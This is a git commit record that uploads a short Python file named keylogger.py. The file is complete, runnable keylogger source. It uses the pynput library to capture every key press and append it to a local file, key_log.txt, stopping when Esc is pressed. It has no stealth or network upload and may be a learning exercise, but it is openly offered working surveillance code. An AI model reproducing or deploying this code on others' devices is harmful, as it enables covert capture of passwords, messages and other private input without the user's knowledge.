8b11715629ed3e9ae65bf085b3faac09cad2101b
amulya-a22 <amulyarao5761@gmail.com>
2025-08-16 21:44:21 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,18 @@
+from pynput import keyboard
+
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+    if key == keyboard.Key.esc:
+        
+        return False
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
